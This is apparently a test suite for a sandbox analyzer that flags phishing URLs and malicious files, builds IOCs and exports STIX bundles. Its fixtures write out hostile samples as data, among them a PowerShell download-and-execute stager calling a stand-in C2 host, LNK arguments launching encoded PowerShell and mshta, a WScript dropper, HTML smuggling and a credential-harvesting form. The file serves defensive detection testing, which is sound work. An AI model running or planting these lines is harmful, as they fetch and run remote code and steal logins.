import { createHash } from "node:crypto";
import { crc32, deflateRawSync } from "node:zlib";
import { describe, expect, it } from "vitest";
import { analyzeFile, analyzeUrl, defang, MAX_FILE_BYTES, registrableDomain, toStix, type Analysis } from "@/server/sandbox/analyze";

/* ───────────── helpers ───────────── */

const ids = (a: Analysis) => a.findings.map((f) => f.id);
const byId = (a: Analysis, id: string) => a.findings.find((f) => f.id === id);
const sumWeights = (a: Analysis) => a.findings.reduce((s, f) => s + f.weight, 0);

/** The score is the clamped weight sum and the verdict follows the 35 / 70 thresholds. */
function expectConsistent(a: Analysis) {
  const expectedScore = Math.max(0, Math.min(100, sumWeights(a)));
  expect(a.score).toBe(expectedScore);
  expect(a.score).toBeGreaterThanOrEqual(0);
  expect(a.score).toBeLessThanOrEqual(100);
  expect(a.verdict).toBe(expectedScore >= 70 ? "malicious" : expectedScore >= 35 ? "suspicious" : "clean");
  for (const f of a.findings) {
    expect(f.id).toMatch(/^(url|file)\.[a-z_]+$/);
    expect(typeof f.weight).toBe("number");
    expect(f.weight).toBeGreaterThanOrEqual(0);
    expect(["info", "low", "medium", "high"]).toContain(f.severity);
  }
  // IOCs are de-duplicated by type:value.
  const keys = a.iocs.map((i) => `${i.type}:${i.value}`);
  expect(new Set(keys).size).toBe(keys.length);
}

type ZipFile = { name: string; data: Buffer | string; deflate?: boolean; encrypted?: boolean };

/** Minimal ZIP writer: local headers, central directory and EOCD, the layout readZipEntries walks. */
function buildZip(files: ZipFile[]): Buffer {
  const parts: Buffer[] = [];
  const central: Buffer[] = [];
  let offset = 0;
  for (const f of files) {
    const raw = Buffer.isBuffer(f.data) ? f.data : Buffer.from(f.data);
    const body = f.deflate ? deflateRawSync(raw) : raw;
    const nameBuf = Buffer.from(f.name);
    const flags = f.encrypted ? 1 : 0;
    const method = f.deflate ? 8 : 0;
    const local = Buffer.alloc(30);
    local.writeUInt32LE(0x04034b50, 0);
    local.writeUInt16LE(20, 4);
    local.writeUInt16LE(flags, 6);
    local.writeUInt16LE(method, 8);
    local.writeUInt32LE(crc32(raw), 14);
    local.writeUInt32LE(body.length, 18);
    local.writeUInt32LE(raw.length, 22);
    local.writeUInt16LE(nameBuf.length, 26);
    parts.push(local, nameBuf, body);
    const c = Buffer.alloc(46);
    c.writeUInt32LE(0x02014b50, 0);
    c.writeUInt16LE(20, 4);
    c.writeUInt16LE(20, 6);
    c.writeUInt16LE(flags, 8);
    c.writeUInt16LE(method, 10);
    c.writeUInt32LE(crc32(raw), 16);
    c.writeUInt32LE(body.length, 20);
    c.writeUInt32LE(raw.length, 24);
    c.writeUInt16LE(nameBuf.length, 28);
    c.writeUInt32LE(offset, 42);
    central.push(c, nameBuf);
    offset += 30 + nameBuf.length + body.length;
  }
  const cd = Buffer.concat(central);
  const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0);
  end.writeUInt16LE(files.length, 8);
  end.writeUInt16LE(files.length, 10);
  end.writeUInt32LE(cd.length, 12);
  end.writeUInt32LE(offset, 16);
  return Buffer.concat([...parts, cd, end]);
}

const MZ = Buffer.concat([Buffer.from("MZ"), Buffer.alloc(64)]);
const LNK_HEADER = Buffer.from([0x4c, 0, 0, 0, 0x01, 0x14, 0x02, 0, 0, 0, 0, 0, 0xc0, 0, 0, 0, 0, 0, 0, 0x46]);
const lnk = (args: string) => Buffer.concat([LNK_HEADER, Buffer.from(args, "utf16le")]);

const OOXML_BASE: ZipFile[] = [
  { name: "[Content_Types].xml", data: `<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>` },
  { name: "word/document.xml", data: "<w:document><w:body><w:p>CV</w:p></w:body></w:document>" },
];

/* ───────────── URLs ───────────── */

describe("analyzeUrl", () => {
  it("rates a plain https URL on an ordinary domain clean", () => {
    const a = analyzeUrl("https://example.com/about");
    expect(a.kind).toBe("url");
    expect(a.verdict).toBe("clean");
    expect(a.score).toBe(0);
    expect(a.findings).toEqual([]);
    expect(a.sha256).toBeNull();
    expect(a.sizeBytes).toBeNull();
    expect(a.objectName).toBe("https://example.com/about");
    expect(a.iocs).toContainEqual({ type: "url", value: "https://example.com/about" });
    expect(a.iocs).toContainEqual({ type: "domain", value: "example.com" });
    expect(a.mitre).toEqual(["T1566.002"]);
    expectConsistent(a);
  });

  it("does not flag legitimate brand domains as lookalikes", () => {
    const ms = analyzeUrl("https://login.microsoftonline.com/common/oauth2/authorize");
    expect(ids(ms)).not.toContain("url.brand_lookalike");
    expect(ms.verdict).toBe("clean");
    const asan = analyzeUrl("https://asan.gov.az/");
    expect(asan.findings).toEqual([]);
    expect(asan.verdict).toBe("clean");
  });

  it("flags a brand lookalike login domain", () => {
    const a = analyzeUrl("https://paypal.com.account-verify.net/signin");
    expect(byId(a, "url.brand_lookalike")).toMatchObject({ severity: "high", weight: 32, params: { brand: "paypal" } });
    expect(byId(a, "url.lure_words")).toMatchObject({ params: { word: "signin" } });
    expect(a.verdict).toBe("suspicious");
    expect(a.mitre).toEqual(expect.arrayContaining(["T1583.001", "T1056.003", "T1204.001"]));
    expectConsistent(a);
  });

  it("rates a typosquatted M365 login on a risky TLD over http malicious", () => {
    const a = analyzeUrl("http://m365-login-verify.top/common/oauth2/signin?client=office");
    expect(ids(a)).toEqual(expect.arrayContaining(["url.no_tls", "url.risky_tld", "url.brand_lookalike", "url.lure_words"]));
    expect(byId(a, "url.risky_tld")?.params).toEqual({ tld: "top" });
    expect(byId(a, "url.brand_lookalike")?.params).toEqual({ brand: "m365" });
    expect(byId(a, "url.lure_words")?.params).toEqual({ word: "login" });
    expect(a.score).toBe(72);
    expect(a.verdict).toBe("malicious");
    expect(a.mitre).toEqual(["T1056.003", "T1204.001", "T1566.002", "T1583.001"]);
    expectConsistent(a);
  });

  it("flags a raw IP host and reports an ip IOC instead of a domain", () => {
    const a = analyzeUrl("http://192.168.10.5/login");
    expect(byId(a, "url.ip_host")).toMatchObject({ severity: "high", weight: 28 });
    expect(ids(a)).toContain("url.no_tls");
    expect(a.verdict).toBe("suspicious");
    expect(a.iocs).toContainEqual({ type: "ip", value: "192.168.10.5" });
    expect(a.iocs.some((i) => i.type === "domain")).toBe(false);
    expectConsistent(a);
  });

  it("flags credentials embedded in the URL", () => {
    const a = analyzeUrl("https://user:pass@secure-update-account.xyz/login");
    expect(byId(a, "url.userinfo_redirect")).toMatchObject({ severity: "high", weight: 30 });
    expect(ids(a)).toEqual(expect.arrayContaining(["url.risky_tld", "url.lure_words"]));
    expect(a.verdict).toBe("suspicious");
    expect(a.iocs).toContainEqual({ type: "domain", value: "secure-update-account.xyz" });
    expectConsistent(a);

    // A bare "trusted-looking@real-host" also counts: the part before @ is userinfo, not the host.
    const bare = analyzeUrl("https://login.microsoft.com@evil-host.example/path");
    expect(ids(bare)).toContain("url.userinfo_redirect");
    expect(bare.iocs).toContainEqual({ type: "domain", value: "evil-host.example" });
  });

  it("flags punycode hosts, including IDN input that the URL parser converts", () => {
    const raw = analyzeUrl("https://xn--pypal-4ve.com/signin");
    expect(byId(raw, "url.punycode")).toMatchObject({ severity: "high", weight: 30 });
    expect(raw.verdict).toBe("suspicious");
    expect(raw.mitre).toContain("T1583.001");
    expectConsistent(raw);

    const idn = analyzeUrl("https://p\u0430ypal.com/signin");
    expect(ids(idn)).toContain("url.punycode");
    expect(idn.iocs.find((i) => i.type === "domain")?.value.startsWith("xn--")).toBe(true);
  });

  it("flags a very long subdomain chain", () => {
    const alone = analyzeUrl("https://a.b.c.d.example.com/");
    expect(alone.findings).toEqual([{ id: "url.deep_subdomains", severity: "low", weight: 8 }]);
    expect(alone.verdict).toBe("clean");
    expect(ids(analyzeUrl("https://a.b.example.com/"))).not.toContain("url.deep_subdomains");

    const a = analyzeUrl("http://login.microsoftonline.com.secure-verify.session.auth.cdn-host.top/common/");
    expect(ids(a)).toEqual(expect.arrayContaining(["url.deep_subdomains", "url.brand_lookalike", "url.no_tls", "url.risky_tld", "url.lure_words"]));
    expect(byId(a, "url.brand_lookalike")?.params).toEqual({ brand: "microsoft" });
    expect(a.verdict).toBe("malicious");
    expectConsistent(a);
  });

  it("flags an http login path with an open redirect", () => {
    const a = analyzeUrl("http://my-bank-online.xyz/account/login?next=https://kapitalbank.az");
    expect(byId(a, "url.no_tls")).toMatchObject({ severity: "medium", weight: 12 });
    expect(byId(a, "url.lure_words")?.params).toEqual({ word: "login" });
    expect(ids(a)).toEqual(expect.arrayContaining(["url.open_redirect", "url.risky_tld"]));
    expect(ids(a)).not.toContain("url.brand_lookalike");
    expect(a.verdict).toBe("suspicious");
    expectConsistent(a);

    // http alone is only a medium signal.
    const plainHttp = analyzeUrl("http://example.com/");
    expect(plainHttp.findings).toEqual([{ id: "url.no_tls", severity: "medium", weight: 12 }]);
    expect(plainHttp.verdict).toBe("clean");
  });

  it("treats a capital I posing as l in the host as a homoglyph (35 is exactly suspicious)", () => {
    const a = analyzeUrl("https://paypaI.com/login");
    expect(byId(a, "url.homoglyph_case")).toMatchObject({ weight: 25, params: { host: "paypaI.com" } });
    expect(a.score).toBe(35);
    expect(a.verdict).toBe("suspicious");
    expectConsistent(a);
  });

  it("flags double extensions and direct downloads in the path", () => {
    const a = analyzeUrl("https://files.example.com/invoice.pdf.exe");
    expect(ids(a)).toEqual(expect.arrayContaining(["url.double_extension", "url.direct_download", "url.lure_words"]));
    expect(a.mitre).toEqual(expect.arrayContaining(["T1036.007", "T1204.002"]));
    expect(a.verdict).toBe("suspicious");
    expectConsistent(a);
  });

  it("flags shorteners and odd ports as low-weight signals", () => {
    expect(byId(analyzeUrl("https://bit.ly/3xYz"), "url.shortener")).toMatchObject({ weight: 15, params: { host: "bit.ly" } });
    expect(byId(analyzeUrl("https://example.com:8443/"), "url.odd_port")).toMatchObject({ weight: 8, params: { port: "8443" } });
    expect(ids(analyzeUrl("https://example.com:443/"))).not.toContain("url.odd_port");
  });

  it("short-circuits script schemes without producing IOCs", () => {
    const a = analyzeUrl("javascript:alert(document.cookie)");
    expect(a.findings).toEqual([{ id: "url.script_scheme", severity: "high", weight: 60 }]);
    expect(a.iocs).toEqual([]);
    expect(a.verdict).toBe("suspicious");
    expect(a.mitre).toContain("T1059.007");
    expect(a.objectName).toBe("javascript:alert(document.cookie)");
  });

  it("reports unparseable input as a finding instead of throwing", () => {
    const a = analyzeUrl("not a url at all");
    expect(a.findings).toEqual([{ id: "url.unparseable", severity: "medium", weight: 20 }]);
    expect(a.iocs).toEqual([]);
    expect(a.verdict).toBe("clean");
  });

  it("clamps the score at 100 when many findings stack", () => {
    const a = analyzeUrl(`http://user:pw@login.microsoftonline.com.secure.verify.cdn.evil.top:8080/invoice.pdf.exe?next=https://x.com&${"p=1&".repeat(30)}`);
    expect(sumWeights(a)).toBeGreaterThan(100);
    expect(a.score).toBe(100);
    expect(a.verdict).toBe("malicious");
    expect(ids(a)).toContain("url.long");
    expectConsistent(a);
  });
});

/* ───────────── files ───────────── */

describe("analyzeFile", () => {
  it("rates plain text clean with a single info finding and hash/filename IOCs", () => {
    const bytes = Buffer.from("hello world, meeting at 10");
    const a = analyzeFile("notes.txt", bytes);
    expect(a.kind).toBe("file");
    expect(a.verdict).toBe("clean");
    expect(a.score).toBe(0);
    expect(a.findings).toEqual([{ id: "file.no_findings", severity: "info", weight: 0 }]);
    expect(a.sha256).toBe(createHash("sha256").update(bytes).digest("hex"));
    expect(a.sizeBytes).toBe(bytes.length);
    expect(a.iocs).toEqual([
      { type: "sha256", value: a.sha256 },
      { type: "filename", value: "notes.txt" },
    ]);
    expect(a.mitre).toEqual([]);
    expectConsistent(a);
  });

  it("truncates the object name to 255 characters", () => {
    const a = analyzeFile(`${"a".repeat(300)}.txt`, Buffer.from("x".repeat(16)));
    expect(a.objectName).toHaveLength(255);
  });

  it("exports MAX_FILE_BYTES and re-exports defang", () => {
    expect(MAX_FILE_BYTES).toBe(10 * 1024 * 1024);
    expect(defang("https://evil.top/x")).toBe("hxxps://evil[.]top/x");
  });

  // readUInt32LE(0) on a buffer shorter than 4 bytes throws RangeError (analyze.ts:224),
  // so an empty or 1-3 byte upload crashes instead of coming back clean.
  it("does not throw on an empty or tiny upload", () => {
    expect(() => analyzeFile("empty.txt", Buffer.alloc(0))).not.toThrow();
    expect(() => analyzeFile("tiny.txt", Buffer.from("hi"))).not.toThrow();
  });

  describe("names and types", () => {
    it("flags a double extension hiding a PE executable", () => {
      const a = analyzeFile("invoice.pdf.exe", MZ);
      expect(byId(a, "file.double_extension")).toMatchObject({ severity: "high", weight: 35, params: { shown: "pdf", real: "exe" } });
      expect(byId(a, "file.risky_type")).toMatchObject({ weight: 25, params: { ext: "exe" } });
      expect(byId(a, "file.pe_executable")).toMatchObject({ severity: "high", weight: 30 });
      expect(a.score).toBe(90);
      expect(a.verdict).toBe("malicious");
      expect(a.mitre).toEqual(expect.arrayContaining(["T1036.007", "T1204.002"]));
      expectConsistent(a);
    });

    it("flags a right-to-left override in the name", () => {
      const a = analyzeFile("faktura\u202efdp.exe", Buffer.from("not really a pdf"));
      expect(byId(a, "file.rtlo")).toMatchObject({ severity: "high", weight: 35 });
      expect(ids(a)).toContain("file.risky_type");
      expect(a.verdict).toBe("suspicious");
      expect(a.mitre).toContain("T1036.002");
      expectConsistent(a);
    });

    it("flags a type mismatch when a .jpg is really a PE", () => {
      const a = analyzeFile("holiday.jpg", MZ);
      expect(byId(a, "file.type_mismatch")).toMatchObject({ weight: 35, params: { ext: "jpg", actual: "pe" } });
      expect(ids(a)).toContain("file.pe_executable");
      expect(a.verdict).toBe("suspicious");
      expect(a.mitre).toContain("T1036.008");
      expectConsistent(a);
    });

    it("accepts a genuine JPEG", () => {
      const jpeg = Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46]), Buffer.alloc(2048, 7)]);
      const a = analyzeFile("shared image.jpeg", jpeg);
      expect(a.findings).toEqual([{ id: "file.no_findings", severity: "info", weight: 0 }]);
      expect(a.verdict).toBe("clean");
    });

    it("flags an ISO image by its CD001 descriptor", () => {
      const iso = Buffer.alloc(0x8010);
      iso.write("CD001", 0x8001, "latin1");
      const a = analyzeFile("delivery.iso", iso);
      expect(byId(a, "file.disk_image")).toMatchObject({ severity: "medium", weight: 20 });
      expect(byId(a, "file.risky_type")?.params).toEqual({ ext: "iso" });
      expect(a.verdict).toBe("suspicious");
      expect(a.mitre).toContain("T1553.005");
      expectConsistent(a);
    });

    it("flags high entropy in an unrecognised blob", () => {
      let seed = Buffer.from("entropy");
      const chunks: Buffer[] = [];
      for (let i = 0; i < 160; i++) {
        seed = createHash("sha256").update(seed).digest();
        chunks.push(seed);
      }
      const blob = Buffer.concat(chunks);
      blob.fill(0, 0, 8);
      const a = analyzeFile("blob.bin", blob);
      const f = byId(a, "file.high_entropy");
      expect(f).toMatchObject({ severity: "low", weight: 8 });
      expect(Number(f?.params?.entropy)).toBeGreaterThan(7.6);
      expect(a.mitre).toContain("T1027.002");
    });
  });

  describe("shortcuts and scripts", () => {
    it("flags a .lnk shortcut even without a payload", () => {
      const a = analyzeFile("faktura.lnk", lnk("C:\\Users\\Public\\Documents\\notes.txt"));
      expect(byId(a, "file.lnk")).toMatchObject({ severity: "high", weight: 30 });
      expect(byId(a, "file.risky_type")).toMatchObject({ weight: 30, params: { ext: "lnk" } });
      expect(ids(a)).not.toContain("file.powershell");
      expect(a.score).toBe(60);
      expect(a.verdict).toBe("suspicious");
      expectConsistent(a);
    });

    it("reads UTF-16 LNK arguments for PowerShell, LOLBins and URLs", () => {
      const a = analyzeFile("faktura_1042.lnk", lnk("C:\\Windows\\System32\\cmd.exe /c powershell -w hidden -enc SQBFAFgA & mshta https://evil-cdn.top/p.hta"));
      expect(ids(a)).toEqual(expect.arrayContaining(["file.lnk", "file.risky_type", "file.powershell", "file.lolbin"]));
      expect(byId(a, "file.powershell")).toMatchObject({ severity: "high", weight: 30 });
      expect(byId(a, "file.lolbin")).toMatchObject({ severity: "high", weight: 20 });
      expect(a.iocs).toContainEqual({ type: "url", value: "https://evil-cdn.top/p.hta" });
      expect(a.iocs).toContainEqual({ type: "domain", value: "evil-cdn.top" });
      expect(sumWeights(a)).toBeGreaterThan(100);
      expect(a.score).toBe(100);
      expect(a.verdict).toBe("malicious");
      expect(a.mitre).toEqual(expect.arrayContaining(["T1059.001", "T1218", "T1204.002"]));
      expectConsistent(a);
    });

    it("flags a .js dropper using WScript and PowerShell", () => {
      const a = analyzeFile("update.js", Buffer.from(`var s = new ActiveXObject("WScript.Shell"); s.Run("powershell -enc SQBFAFgA", 0);`));
      expect(byId(a, "file.risky_type")).toMatchObject({ weight: 30, params: { ext: "js" } });
      expect(ids(a)).toEqual(expect.arrayContaining(["file.powershell", "file.lolbin"]));
      expect(a.verdict).toBe("malicious");
      expect(a.mitre).toEqual(expect.arrayContaining(["T1204.002", "T1059.001", "T1059.005"]));
      expectConsistent(a);
    });

    it("flags a .vbs using a shell object", () => {
      const a = analyzeFile("invoice.vbs", Buffer.from(`Set o = CreateObject("Shell.Application")\no.ShellExecute "calc.exe"`));
      expect(byId(a, "file.risky_type")?.params).toEqual({ ext: "vbs" });
      expect(byId(a, "file.lolbin")).toMatchObject({ weight: 20 });
      expect(ids(a)).not.toContain("file.powershell");
      expect(a.score).toBe(50);
      expect(a.verdict).toBe("suspicious");
      expectConsistent(a);
    });

    it("flags a .hta with the mshta technique id", () => {
      const a = analyzeFile("run.hta", Buffer.from(`<html><script>new ActiveXObject("WScript.Shell").Run("cmd");</script></html>`));
      expect(ids(a)).toEqual(expect.arrayContaining(["file.risky_type", "file.lolbin"]));
      expect(a.verdict).toBe("suspicious");
      expect(a.mitre).toContain("T1218.005");
      expectConsistent(a);
    });

    it("extracts the download URL from a PowerShell stager", () => {
      const a = analyzeFile("update.ps1", Buffer.from("IEX (New-Object Net.WebClient).DownloadString('https://c2-stage.top/a')"));
      expect(ids(a)).toEqual(expect.arrayContaining(["file.risky_type", "file.powershell"]));
      expect(a.iocs).toContainEqual({ type: "url", value: "https://c2-stage.top/a" });
      expect(a.verdict).toBe("suspicious");
      expectConsistent(a);
    });
  });

  describe("html", () => {
    it("rates an ordinary page clean and de-duplicates its links as IOCs", () => {
      const a = analyzeFile("about.html", Buffer.from(`<!doctype html><html><body><h1>About</h1><a href="https://example.com/team">Team</a><a href="https://example.com/team">Again</a></body></html>`));
      expect(a.findings).toEqual([{ id: "file.no_findings", severity: "info", weight: 0 }]);
      expect(a.verdict).toBe("clean");
      expect(a.iocs.filter((i) => i.type === "url")).toEqual([{ type: "url", value: "https://example.com/team" }]);
      expect(a.iocs).toContainEqual({ type: "domain", value: "example.com" });
      expectConsistent(a);
    });

    it("flags a password form posting to another host", () => {
      const a = analyzeFile("login.html", Buffer.from(`<!doctype html><html><body><form action="https://maas-portal.info/giris" method="post"><input name="user"><input type="password" name="p"></form></body></html>`));
      expect(byId(a, "file.html_credential_form")).toMatchObject({ severity: "high", weight: 32 });
      expect(byId(a, "file.html_external_post")).toMatchObject({ weight: 20, params: { host: "maas-portal.info" } });
      expect(a.score).toBe(52);
      expect(a.verdict).toBe("suspicious");
      expect(a.iocs).toContainEqual({ type: "url", value: "https://maas-portal.info/giris" });
      expect(a.iocs).toContainEqual({ type: "domain", value: "maas-portal.info" });
      expect(a.mitre).toEqual(expect.arrayContaining(["T1056.003", "T1566.001"]));
      expectConsistent(a);
    });

    it("rates a full phishing kit with obfuscation and a refresh malicious", () => {
      const a = analyzeFile(
        "maas_yenilenmesi.html",
        Buffer.from(
          `<!doctype html><html><head><meta http-equiv="refresh" content="300"></head><body><form action="https://maas-portal.info/giris" method="post"><input name="email"><input type="password" name="p"></form><script>var k=atob("aHR0cHM6Ly9tYWFzLXBvcnRhbC5pbmZvL2M=");document.write(unescape("%3Cimg%20src%3D%22"+k+"%22%3E"));</script></body></html>`,
        ),
      );
      expect(ids(a)).toEqual(expect.arrayContaining(["file.html_credential_form", "file.html_external_post", "file.obfuscated_script", "file.redirect"]));
      expect(a.score).toBe(77);
      expect(a.verdict).toBe("malicious");
      expect(a.mitre).toContain("T1027");
      expectConsistent(a);
    });

    it("flags HTML smuggling", () => {
      const a = analyzeFile("invoice.html", Buffer.from(`<html><body><script>const b = new Blob([atob("TVqQ")], { type: "application/octet-stream" }); const a = document.createElement("a"); a.href = URL.createObjectURL(b); a.download = "invoice.exe"; a.click();</script></body></html>`));
      expect(byId(a, "file.html_smuggling")).toMatchObject({ severity: "high", weight: 30 });
      expect(ids(a)).toContain("file.obfuscated_script");
      expect(a.verdict).toBe("suspicious");
      expect(a.mitre).toContain("T1027.006");
      expectConsistent(a);
    });
  });

  describe("pdf and ole", () => {
    it("flags JavaScript and auto-actions in a PDF and extracts its URIs", () => {
      const a = analyzeFile("statement.pdf", Buffer.from("%PDF-1.7\n1 0 obj << /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >> endobj\n2 0 obj << /URI (https://pdf-lure.top/x) >> endobj\n%%EOF"));
      expect(byId(a, "file.pdf_javascript")).toMatchObject({ severity: "high", weight: 28 });
      expect(byId(a, "file.pdf_autoaction")).toMatchObject({ weight: 12 });
      expect(ids(a)).not.toContain("file.type_mismatch");
      expect(a.verdict).toBe("suspicious");
      expect(a.iocs).toContainEqual({ type: "url", value: "https://pdf-lure.top/x" });
      expect(a.mitre).toContain("T1059.007");
      expectConsistent(a);
    });

    it("flags an OLE document carrying a VBA project", () => {
      const a = analyzeFile("old.doc", Buffer.concat([Buffer.from([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]), Buffer.from("....Macros....ThisDocument....")]));
      expect(byId(a, "file.office_macros")).toMatchObject({ severity: "high", weight: 30 });
      expect(ids(a)).not.toContain("file.type_mismatch");
      expect(a.mitre).toContain("T1059.005");
      expectConsistent(a);
    });
  });

  describe("zip and OOXML", () => {
    it("rates a zip of plain files clean", () => {
      const a = analyzeFile("photos.zip", buildZip([{ name: "readme.txt", data: "nothing to see", deflate: true }]));
      expect(a.findings).toEqual([{ id: "file.no_findings", severity: "info", weight: 0 }]);
      expect(a.verdict).toBe("clean");
    });

    it("flags a disguised archive carrying an executable", () => {
      const zip = buildZip([
        { name: "readme.txt", data: "see attached" },
        { name: "invoice.pdf.exe", data: MZ, deflate: true },
      ]);
      const a = analyzeFile("invoice.pdf.zip", zip);
      expect(byId(a, "file.archive_executable")).toMatchObject({ severity: "high", weight: 30, params: { name: "invoice.pdf.exe" } });
      expect(byId(a, "file.disguised_archive")).toMatchObject({ weight: 15, params: { shown: "pdf", real: "zip" } });
      expect(ids(a)).not.toContain("file.type_mismatch");
      expect(a.score).toBe(45);
      expect(a.verdict).toBe("suspicious");
      expect(a.iocs).toContainEqual({ type: "filename", value: "invoice.pdf.exe" });
      expect(a.mitre).toContain("T1204.002");
      expectConsistent(a);
    });

    it("flags an encrypted archive hiding a script", () => {
      const a = analyzeFile("secret.zip", buildZip([{ name: "payload.js", data: "x", encrypted: true }]));
      expect(byId(a, "file.encrypted_archive")).toMatchObject({ severity: "medium", weight: 15 });
      expect(byId(a, "file.archive_executable")?.params).toEqual({ name: "payload.js" });
      expect(a.verdict).toBe("suspicious");
      expect(a.mitre).toContain("T1027.013");
      expectConsistent(a);
    });

    it("rates a plain .docx clean and inflates deflated parts for IOCs", () => {
      const docx = buildZip([
        OOXML_BASE[0],
        { name: "word/document.xml", data: `<w:document><w:body><w:p><w:hyperlink>https://pay-update.top/doc</w:hyperlink></w:p></w:body></w:document>`, deflate: true },
      ]);
      const a = analyzeFile("cv_namizad.docx", docx);
      expect(a.findings).toEqual([{ id: "file.no_findings", severity: "info", weight: 0 }]);
      expect(a.iocs).toContainEqual({ type: "url", value: "https://pay-update.top/doc" });
      expect(a.iocs).toContainEqual({ type: "domain", value: "pay-update.top" });
      // Namespace URLs in package parts are not indicators.
      expect(a.iocs.some((i) => i.value.includes("schemas.openxmlformats.org"))).toBe(false);
    });

    it("flags a .docm whose package carries a VBA project", () => {
      const a = analyzeFile("maas.docm", buildZip([...OOXML_BASE, { name: "word/vbaProject.bin", data: Buffer.alloc(128, 0xab) }]));
      expect(byId(a, "file.office_macros")).toMatchObject({ severity: "high", weight: 30 });
      expect(byId(a, "file.macro_container")).toMatchObject({ weight: 15, params: { ext: "docm" } });
      expect(ids(a)).not.toContain("file.archive_executable");
      expect(a.score).toBe(45);
      expect(a.verdict).toBe("suspicious");
      expect(a.mitre).toEqual(expect.arrayContaining(["T1059.005", "T1204.002"]));
      expectConsistent(a);
    });

    it("flags macros in a .docx too", () => {
      const a = analyzeFile("cv.docx", buildZip([...OOXML_BASE, { name: "word/vbaProject.bin", data: Buffer.alloc(128, 0xab) }]));
      expect(byId(a, "file.office_macros")).toMatchObject({ severity: "high", weight: 30 });
      expect(ids(a)).not.toContain("file.macro_container");
      expect(a.mitre).toContain("T1059.005");
      expectConsistent(a);
    });

    const remoteTemplate = () =>
      buildZip([
        ...OOXML_BASE,
        {
          name: "word/_rels/settings.xml.rels",
          data: `<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://evil-templates.top/t.dotm" TargetMode="External"/></Relationships>`,
          deflate: true,
        },
      ]);

    it("flags a remote template and extracts its target", () => {
      const a = analyzeFile("offer.docx", remoteTemplate());
      expect(byId(a, "file.remote_template")).toMatchObject({ severity: "high", weight: 30 });
      expect(a.iocs).toContainEqual({ type: "url", value: "https://evil-templates.top/t.dotm" });
      expect(a.iocs).toContainEqual({ type: "domain", value: "evil-templates.top" });
      expect(a.mitre).toContain("T1221");
      expectConsistent(a);
    });

    // analyze.ts:369 feeds the raw .rels text to extractIndicators, bypassing the
    // schemas.* stripping that the generic loop applies at :387, so the OOXML namespace
    // URL and "schemas.openxmlformats.org" are reported (and exported to STIX) as IOCs.
    it("does not report OOXML schema URLs from the remote-template relationship as IOCs", () => {
      const a = analyzeFile("offer.docx", remoteTemplate());
      expect(a.iocs.some((i) => i.value.includes("schemas.openxmlformats.org"))).toBe(false);
    });
  });
});

/* ───────────── STIX ───────────── */

describe("toStix", () => {
  const created = new Date("2026-03-04T05:06:07.000Z");
  const sample: Pick<Analysis, "objectName" | "verdict" | "iocs" | "mitre"> = {
    objectName: "sample",
    verdict: "malicious",
    mitre: ["T1204.002", "T1566.002"],
    iocs: [
      { type: "url", value: "https://evil.top/x" },
      { type: "domain", value: "evil.top" },
      { type: "ip", value: "1.2.3.4" },
      { type: "sha256", value: "a".repeat(64) },
      { type: "email", value: "ceo@evil.top" },
      { type: "filename", value: "invoice.exe" },
    ],
  };
  const uuid = "[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}";

  it("returns a STIX 2.1 bundle with an identity and one indicator per IOC", () => {
    const b = toStix(sample, created, "SB-42");
    expect(b.type).toBe("bundle");
    expect(b.id).toMatch(new RegExp(`^bundle--${uuid}$`));
    expect(b.objects).toHaveLength(1 + sample.iocs.length);

    const identity = b.objects[0];
    expect(identity).toMatchObject({ type: "identity", spec_version: "2.1", name: "Sandbox", identity_class: "system", created: created.toISOString(), modified: created.toISOString() });
    expect(identity.id).toMatch(new RegExp(`^identity--${uuid}$`));

    const indicators = b.objects.slice(1);
    for (const ind of indicators) {
      expect(ind).toMatchObject({
        type: "indicator",
        spec_version: "2.1",
        created_by_ref: identity.id,
        created: created.toISOString(),
        modified: created.toISOString(),
        valid_from: created.toISOString(),
        pattern_type: "stix",
        indicator_types: ["malicious-activity"],
        labels: sample.mitre,
      });
      expect(ind.id).toMatch(new RegExp(`^indicator--${uuid}$`));
    }
    expect(new Set(b.objects.map((o) => o.id)).size).toBe(b.objects.length);
    expect(indicators.map((i) => i.name)).toEqual(["SB-42 url", "SB-42 domain", "SB-42 ip", "SB-42 sha256", "SB-42 email", "SB-42 filename"]);
  });

  it("builds a valid pattern per IOC type", () => {
    const patterns = toStix(sample, created, "SB-42").objects.slice(1).map((o) => (o as { pattern: string }).pattern);
    expect(patterns).toEqual([
      "[url:value = 'https://evil.top/x']",
      "[domain-name:value = 'evil.top']",
      "[ipv4-addr:value = '1.2.3.4']",
      `[file:hashes.'SHA-256' = '${"a".repeat(64)}']`,
      "[email-addr:value = 'ceo@evil.top']",
      "[file:name = 'invoice.exe']",
    ]);
  });

  it("uses anomalous-activity unless the verdict is malicious", () => {
    for (const verdict of ["clean", "suspicious"] as const) {
      const types = toStix({ ...sample, verdict }, created, "SB-1").objects.slice(1).map((o) => (o as { indicator_types: string[] }).indicator_types);
      expect(types).toEqual(sample.iocs.map(() => ["anomalous-activity"]));
    }
  });

  it("escapes single quotes and backslashes in pattern values", () => {
    const b = toStix(
      {
        ...sample,
        iocs: [
          { type: "filename", value: "it's\\a.exe" },
          { type: "url", value: "https://x.test/a'b\\c" },
        ],
      },
      created,
      "SB-7",
    );
    const patterns = b.objects.slice(1).map((o) => (o as { pattern: string }).pattern);
    expect(patterns).toEqual(["[file:name = 'it\\'s\\\\a.exe']", "[url:value = 'https://x.test/a\\'b\\\\c']"]);
  });

  it("exports a malicious URL analysis end to end", () => {
    const a = analyzeUrl("http://m365-login-verify.top/common/oauth2/signin?client=office");
    const b = toStix(a, created, "SB-511");
    const indicators = b.objects.slice(1) as { pattern: string; indicator_types: string[]; labels: string[] }[];
    expect(indicators.map((i) => i.pattern)).toEqual([
      "[url:value = 'http://m365-login-verify.top/common/oauth2/signin?client=office']",
      "[domain-name:value = 'm365-login-verify.top']",
    ]);
    for (const i of indicators) {
      expect(i.indicator_types).toEqual(["malicious-activity"]);
      expect(i.labels).toEqual(a.mitre);
    }
  });

